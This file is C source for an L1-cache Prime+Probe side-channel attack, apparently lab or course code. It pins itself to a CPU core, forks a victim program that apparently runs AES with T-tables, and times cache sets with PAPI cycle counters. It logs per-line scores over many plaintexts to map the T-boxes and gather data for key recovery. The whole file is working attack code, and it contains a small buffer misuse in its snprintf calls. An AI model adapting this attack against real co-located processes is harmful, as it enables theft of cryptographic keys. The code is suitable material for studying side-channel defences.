#define _GNU_SOURCE              

#include <papi.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>
#include <time.h>

#define WAIT_TIME 0
#define Nt 32
#define It 2048
#define N 256
#define I 128

#define L1_LINES 64
#define LOGICAL_CORE 3              //  logical core where this process will run on
#define SIZE32KB (32*1024)          //  represents 32 KB
#define W 8                         //  associativity number of L1
#define STRIDE (SIZE32KB/W)         //  step distance between the consecutive accesses in order to fill a particular line of L1
#define C_BLOCK_SIZE 64             //  bytes space between each attacker thread [block size=64]

void cpu_setup();
void papi_config(int * retval, int * eventSet);
void get_plaintexts_t( char * plaintext,  char * plaintext2, int repetition, int min, int max);
void get_plaintext(char * plaintext);
// int L1_line_translator( void * addr );
// int L1_cache_block_offset_translator( void * addr);
int handle_error(int code, char *outstring);

char V[SIZE32KB];                   

int main(void) { 

    cpu_setup();

    long_long values[1];
    int retval, EventSet=PAPI_NULL;
    papi_config(&retval, &EventSet);
    srand(time(NULL));   

    FILE* logfile;
    char file_name[35];
    register int min;
    register int i;
    register int ii;
    // register int iii;
    char * args[5]; // should be char * const instead !!!
    int pid  = 0;
    int status;
    char plaintext[16*(3+1)+1];
    char plaintext2[16*(3+1)+1];
    long final_score[L1_LINES] = {0};


    printf("### T-Box Mapping Info Extraction\n");

    for(int j = 0; j < Nt ; j++){

        for(int l = 0;  l<L1_LINES; l++){
            final_score[l] = 0;
        }


        if(j%2 == 0){
            get_plaintexts_t(plaintext,plaintext2,j,0,16);
        }
        if(j%2 == 1) {
            strcpy(plaintext,plaintext2);
        }

        args[0] = "./vic";
        args[1] = plaintext;
        args[2] = "key";
        args[3] =  NULL;


        if ( (pid = fork())== 0) 
            execv("./vic", args);

        usleep(WAIT_TIME);

        while(!waitpid(pid, &status, WNOHANG)){      
    
            for ( min=0; min<SIZE32KB/W; min+=C_BLOCK_SIZE) {

                if (PAPI_reset(EventSet) != PAPI_OK)
                    handle_error(1,"reset");
                if (PAPI_read(EventSet, values) != PAPI_OK)
                    handle_error(1,"read");
                if (PAPI_start(EventSet) != PAPI_OK)
                    handle_error(1,"start");
        
                // ----------------------------------------------
                for (ii = 0; ii < It ; ii++) {
                    for(i = min; i < SIZE32KB; i+= STRIDE)
                        V[i] = V[i] + 1;
                }
                // ----------------------------------------------

                if (PAPI_stop(EventSet, values) != PAPI_OK)
                    handle_error(1,"stop");


                final_score[min/C_BLOCK_SIZE]+= values[0];
            }

            
        }

        snprintf(file_name, sizeof(file_name), "side_channel_info/table#%i.out",j);
        logfile = fopen(file_name,"w");
        for(int i = 0; i < L1_LINES; i++){
            fprintf(logfile,"%ld\n", final_score[i]);
        }
        fclose(logfile);


    }

    // return 0; // ONly FOR TESSTINGG ==========================================


    printf("### Side Channel Information Extraction !\n"); // this print is required (check book)

    // Measurement loop
    for(int j = 0; j < N ; j++){    

        // resets the score structures
        for(int l = 0;  l<L1_LINES; l++){
            final_score[l] = 0;
        }

        get_plaintext(plaintext);
        args[0] = "./vic";
        args[1] = plaintext;
        args[2] =  NULL;

        // fork & creation of a victim
        if ( (pid = fork())== 0) {
            execv("./vic", args);
        }

        usleep(WAIT_TIME);


        while(!waitpid(pid, &status, WNOHANG)){

            for ( min=0 ; min < STRIDE; min+=C_BLOCK_SIZE) {
                
                if (PAPI_reset(EventSet) != PAPI_OK)
                    handle_error(1,"reset");
                if (PAPI_read(EventSet, values) != PAPI_OK)
                    handle_error(1,"read");
                if (PAPI_start(EventSet) != PAPI_OK)
                    handle_error(1,"start");

                // ----------------------------------------------
                for (ii = 0; ii < I; ii++) {
                    for(i = min; i < SIZE32KB; i+= STRIDE)
                        V[i] = V[i] + 1;
                }
                // ----------------------------------------------
                if (PAPI_stop(EventSet, values) != PAPI_OK)
                    handle_error(1,"stop");

                final_score[min/C_BLOCK_SIZE] += values[0];
            }
        }

        // writes cache miss SCI to file
        snprintf(file_name, sizeof(file_name), "side_channel_info/meas#%i.out",j);
        logfile = fopen(file_name, "w");
        fprintf(logfile,"%s\n", plaintext);
        for ( min=0 ; min<STRIDE ; min+=C_BLOCK_SIZE) 
            fprintf(logfile,"%ld\n", final_score[min/C_BLOCK_SIZE]);
        fclose(logfile);

    }


    return 0;

}


void get_plaintexts_t( char * plaintext, char * plaintext2, int repetition, int min, int max){
    
    int rand_value;
    char num[4];

    plaintext[0] = '\0';
    plaintext2[0] = '\0';

    for (int i= 0; i<16; i++){

        if(i%4 == 3){

            rand_value = (random()%(256-max))+(max-min);
            snprintf(num, sizeof(num)+1, "%i.", rand_value); // +1 because of '\0'
            strcat(plaintext, num);
            strcat(plaintext2, num);
        }

        else{

        
            // [16-256]
            rand_value = (random()%(256-max))+(max-min);
            snprintf(num, sizeof(num)+1, "%i.", rand_value);
            strcat(plaintext,num);

            /// [0-16]
            rand_value = (i%(max-min))+(min);
            snprintf(num, sizeof(num)+1, "%i.", rand_value);
            strcat(plaintext2,num);
        }
    }
}




void get_plaintext(char * plaintext){
    
    int rand_value;
    char num[4];

    plaintext[0] = '\0';

    for (int i= 0; i<16; i++){
        rand_value = random()%256;    // change it to better random mech 
        snprintf(num, sizeof(num)+1, "%i.", rand_value); // +1 because of '\0'
        // to uncomment
        strcat(plaintext, num); 
    }
    // to delete || DEBUG
    // strcpy(plaintext, "126.70.226.1.192.134.136.57.174.126.232.97.253.14.174.67.");

}




void papi_config(int * retval, int * EventSet){

        *retval = PAPI_library_init(PAPI_VER_CURRENT);
    if (*retval != PAPI_VER_CURRENT) { 
        fprintf(stderr, "PAPI library init error!\n");
        exit(1);
    }
    if (PAPI_create_eventset(EventSet) != PAPI_OK)
        handle_error(1, "create_eventset");
    if (PAPI_add_event(*EventSet, PAPI_REF_CYC)!= PAPI_OK) 
        handle_error(1,"add_event");


}


void cpu_setup(){

    cpu_set_t mask;
    CPU_ZERO( &mask );                                              // clears the set mask
    CPU_SET( LOGICAL_CORE, &mask );                                 // adds the cpu to the mask set
    if( sched_setaffinity( getpid(), sizeof(mask), &mask ) == -1 ){ // sets the CPU affinity mask of the process
        printf("WARNING: Could not set CPU Affinity...\n");
    }
}

// int L1_line_translator( void * addr) {

//     uint64_t n = (uintptr_t) (addr);
//     uint64_t x = (n>>6)%SIZE32KB%64;    
//     return (int) x;
// }

// int L1_cache_block_offset_translator( void * addr) {

//     uint64_t n = (uintptr_t) (addr);
//     uint64_t x = n%SIZE32KB%64;    
//     return (int) x;
// }

int handle_error(int code, char *outstring){
    
    printf("Error in PAPI function call %s\n", outstring);
    PAPI_perror("PAPI Error");
    exit(1);
}
